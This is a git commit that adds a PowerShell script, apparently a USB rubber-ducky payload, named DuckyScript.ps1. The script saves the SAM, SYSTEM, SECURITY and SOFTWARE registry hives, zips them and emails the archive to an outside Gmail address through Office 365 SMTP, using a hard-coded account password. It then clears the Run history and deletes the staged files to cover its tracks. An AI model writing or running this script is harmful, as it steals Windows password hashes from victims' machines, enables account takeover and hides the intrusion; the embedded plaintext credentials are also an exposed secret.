11617c9312faaa707fc4029b5d69270c015d9045
Yohan Chathuranga <yohanchathuranga72565@gmail.comm>
2024-04-22 10:45:01 +0100

    Second commit

---
+++ DuckyScript.ps1
@@ -0,0 +1,21 @@
+mkdir c:\datafiles
+reg SAVE HKLM\SAM C:\datafiles\SAM
+reg SAVE HKLM\SYSTEM C:\datafiles\SYSTEM
+reg SAVE HKLM\SECURITY C:\datafiles\SECURITY
+reg SAVE HKLM\SOFTWARE C:\datafiles\SOFTWARE
+Compress-Archive "C:\datafiles" "C:\datafiles.zip"
+$SMTPServer = 'smtp.office365.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('yohanchathuranga72565@outlook.com', 'CNS@1234')
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'yohanchathuranga72565@outlook.com'
+$ReportEmail.To.Add('yohanchathuranga72565@gmail.com')
+$ReportEmail.Subject = "Harvest-Report"
+$ReportEmail.Body = "Hacking files received....!!!!!"
+$ReportEmail.Attachments.Add("C:\datafiles.zip")
+$SMTPInfo.Send($ReportEmail)
+REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+Remove-Item "C:\datafiles.zip"
+Remove-Item "C:\datafiles"
+exit
